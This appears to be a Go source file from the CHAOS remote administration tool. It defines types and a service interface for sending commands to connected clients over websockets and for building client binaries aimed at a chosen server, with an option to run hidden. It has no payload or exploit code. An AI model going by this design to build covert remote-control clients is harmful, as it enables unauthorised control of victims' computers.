package client

import (
	"context"
	"github.com/gorilla/websocket"
	"github.com/tiagorlampert/CHAOS/internal/utils"
	"github.com/tiagorlampert/CHAOS/internal/utils/system"
)

type SendCommandInput struct {
	ClientID  string
	Command   string
	Parameter string
	Request   string
}

type SendCommandOutput struct {
	Response string
}

type BuildClientBinaryInput struct {
	ServerAddress, ServerPort, Filename string
	RunHidden                           bool
	OSTarget                            system.OSType
}

func (b BuildClientBinaryInput) GetServerAddress() string {
	return utils.SanitizeUrl(b.ServerAddress)
}

func (b BuildClientBinaryInput) GetServerPort() string {
	return utils.SanitizeUrl(b.ServerPort)
}

func (b BuildClientBinaryInput) GetFilename() string {
	return utils.SanitizeString(b.Filename)
}

type Service interface {
	AddConnection(clientID string, connection *websocket.Conn) error
	GetConnection(clientID string) (*websocket.Conn, bool)
	RemoveConnection(clientID string) error
	SendCommand(ctx context.Context, input SendCommandInput) (SendCommandOutput, error)
	BuildClient(BuildClientBinaryInput) (string, error)
}
